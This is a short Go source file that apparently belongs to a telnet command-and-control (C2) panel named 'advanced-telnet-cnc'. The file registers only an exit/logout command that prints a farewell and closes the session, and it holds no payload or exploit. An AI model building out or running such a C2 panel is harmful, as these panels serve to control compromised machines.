package user

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"exit", "quit", "logout"},
		Description: "Disconnects from the command and control (C2) system.",
		Admin:       false,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			session.Println(config.Red, "Goodbye. </3")
			session.Close()
			return nil
		},
	})
}
